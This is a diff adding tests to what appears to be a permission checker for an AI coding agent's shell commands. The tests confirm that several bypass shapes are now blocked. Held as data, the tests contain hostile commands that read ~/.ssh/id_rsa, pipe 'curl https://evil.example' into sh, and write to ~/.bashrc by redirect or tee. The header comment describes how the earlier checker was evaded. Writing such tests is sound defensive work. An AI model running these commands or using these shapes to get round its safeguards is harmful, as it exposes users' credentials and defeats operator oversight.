@@ -706,3 +706,73 @@ def test_report_table_unchanged_without_json(tmp_path, monkeypatch):
     assert "blocked" in result.output
     assert "curl-exfil-demo" in result.output
 
+
+
+# --------------------------------------------------------------------------- #
+# fix-compound-command-and-write-shape-bypasses — v0.6.0
+#
+# Pre-v0.6, _parse_bash only inspected the FIRST command segment and never
+# surfaced write targets: a leading ``true &&`` (or any ``;``/``&&``/``||``
+# prefix), a pipe into an interpreter, an output redirect, or ``tee`` hid the
+# real target from the path/network logic, and each shape was ALLOWED under
+# network-deny.yaml (shell granted) despite touching a denied path or writing
+# outside ./out/**.
+# --------------------------------------------------------------------------- #
+def test_pipe_into_interpreter_hiding_read_denied(tmp_path):
+    # `echo 'cat ~/.ssh/id_rsa' | bash` — the interpreter's script is the
+    # preceding segment's output; the path hides inside a quoted argument.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "echo 'cat ~/.ssh/id_rsa' | bash"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_pipe_into_interpreter_hiding_egress_denied(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "echo 'curl https://evil.example' | sh"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_second_segment_after_logical_and_denied(tmp_path):
+    # `true && cat ~/.ssh/id_rsa` — only the first segment's verb (true) was
+    # inspected; the read after && was invisible.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "true && cat ~/.ssh/id_rsa"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_redirect_write_outside_scope_denied(tmp_path):
+    # `echo x > ~/.bashrc` — a shell redirect is a WRITE; the profile's write
+    # scope (./out/**) must apply, not just edit_file's.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "echo x > ~/.bashrc"})
+    assert exc.value.decision.rule == "path-not-in-profile"
+
+
+def test_tee_write_outside_scope_denied(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "tee ~/.bashrc < /dev/null"})
+    assert exc.value.decision.rule == "path-not-in-profile"
+
+
+def test_redirect_write_inside_scope_allowed(tmp_path):
+    # The write-scope fix must not break a legitimate in-scope redirect.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    adapter.check("Bash", {"command": "echo x > ./out/f.txt"})
+
+
+def test_quoted_pipe_is_not_a_separator(tmp_path):
+    # `echo 'a|b'` — a | inside a quoted argument is not a command separator;
+    # it must not be split into segments (the command is a plain echo).
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    adapter.check("Bash", {"command": "echo 'a|b'"})
+
+
+def test_benign_pipe_to_tee_in_scope_allowed(tmp_path):
+    # A benign compound command stays allowed: read from ./src, tee into ./out.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    adapter.check("Bash", {"command": "grep -rn pattern ./src | tee ./out/log.txt"})
